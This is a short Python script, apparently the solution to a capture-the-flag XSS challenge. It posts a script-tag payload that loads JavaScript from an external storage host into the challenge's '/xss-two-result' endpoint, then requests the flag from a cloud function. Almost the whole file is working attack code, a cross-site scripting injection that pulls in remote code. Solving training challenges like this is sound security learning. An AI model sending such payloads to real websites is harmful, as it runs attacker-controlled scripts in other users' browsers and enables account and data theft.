import sys
import requests 

if len(sys.argv) != 2:
    print("Please specify challenge URL")
    print("python solution.py <challenge-url>")
else:  
	vector = "<script src='https://storage.googleapis.com/niru-web-tutorials/payload.js'></script>"
	param = {'payload':vector}
	response = requests.post(sys.argv[1] + '/xss-two-result', data=param)
	#print(response.text)
	response = requests.get('https://us-west1-arboretum-backend.cloudfunctions.net/print-flag')
	print(response.text)